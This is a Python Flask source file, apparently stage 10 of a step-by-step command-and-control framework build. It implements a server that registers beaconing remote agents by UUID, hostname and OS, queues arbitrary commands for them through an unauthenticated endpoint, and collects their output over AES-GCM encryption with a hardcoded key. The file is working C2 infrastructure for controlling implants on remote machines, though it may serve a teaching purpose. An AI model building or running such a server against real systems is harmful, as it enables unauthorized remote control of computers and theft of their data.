"""
SERVER — Stage 10 (Agent Identity & Persistent ID)

Matches: agent/stages/stage10.go

What this adds:
- Agents now have a UUID agent_id (not just "go-agent")
- Server stores agents by agent_id
- First beacon auto-registers the agent
- Subsequent beacons update last_seen only
"""

import base64, json, os, uuid
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from datetime import datetime

app = Flask(__name__)

SECRET_KEY = b"01234567890123456789012345678901"

def encrypt(data):
    aes   = AESGCM(SECRET_KEY)
    nonce = os.urandom(12)
    ct    = aes.encrypt(nonce, json.dumps(data).encode(), None)
    return base64.b64encode(nonce + ct).decode()

def decrypt(enc):
    raw       = base64.b64decode(enc)
    nonce, ct = raw[:12], raw[12:]
    aes       = AESGCM(SECRET_KEY)
    return json.loads(aes.decrypt(nonce, ct, None).decode())

# ── State ──────────────────────────────────────────────────────

agents  = {}   # agent_id -> info dict
tasks   = {}   # agent_id -> pending task string
results = {}   # agent_id -> last output

# ── Routes ─────────────────────────────────────────────────────

@app.route("/beacon", methods=["POST"])
def beacon():
    payload  = decrypt(request.json["data"])
    agent_id = payload.get("agent_id")

    if not agent_id:
        return jsonify({"error": "missing agent_id"}), 400

    if agent_id not in agents:
        # First beacon — register
        agents[agent_id] = {
            "hostname":   payload.get("hostname", "?"),
            "os":         payload.get("os", "?"),
            "registered": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        print(f"[+] NEW agent registered: {agent_id} ({agents[agent_id]['hostname']})")
    else:
        agents[agent_id]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        agents[agent_id]["status"]    = payload.get("status", "alive")
        print(f"[.] Heartbeat from {agent_id}")

    if payload.get("output"):
        results[agent_id] = payload["output"]
        print(f"\n[OUTPUT from {agent_id}]\n{payload['output']}\n{'='*40}")

    task = tasks.pop(agent_id, None)
    return jsonify({"data": encrypt({"task": task or ""})})

@app.route("/command", methods=["POST"])
def queue_command():
    data = request.get_json()
    tasks[data["agent_id"]] = data["cmd"]
    return jsonify({"queued": True})

@app.route("/agents")
def list_agents():
    return jsonify(agents)

if __name__ == "__main__":
    print("[*] Stage 10 server started — agent identity tracking")
    app.run(host="0.0.0.0", port=8080, debug=False)
